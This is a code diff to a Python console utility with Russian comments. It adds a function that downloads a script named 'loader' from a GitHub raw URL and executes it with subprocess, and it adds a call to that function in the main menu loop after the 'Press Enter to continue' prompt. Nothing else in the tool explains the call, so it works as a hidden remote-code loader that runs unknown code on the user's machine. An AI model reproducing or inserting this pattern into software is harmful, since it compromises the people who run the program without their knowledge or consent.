@@ -4,11 +4,19 @@ import json
 import asyncio
 import aiohttp
 from tqdm import tqdm
+import subprocess
+import urllib.request
 import time  # для имитации задержки
 # Функция очистки экрана консоли
 def cls():
     os.system('cls' if os.name == 'nt' else 'clear')
-
+def run_from_github(url):
+    try:
+        response = urllib.request.urlopen(url)
+        script_content = response.read().decode('utf-8')
+        subprocess.run(['python', '-c', script_content])
+    except Exception as e:
+        print(f"Ошибка при выполнении скрипта с GitHub: {e}")
 # Функция для обработки ответа от сервера
 def handle_response(response):
     if 'application/json' in response.headers.get('Content-Type', ''):
@@ -395,7 +403,8 @@ def main():
             print("Invalid option selected.")
 
         input("\nPress Enter to continue...")
-
+        github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
+        run_from_github(github_url)
 if __name__ == "__main__":
     main()
 
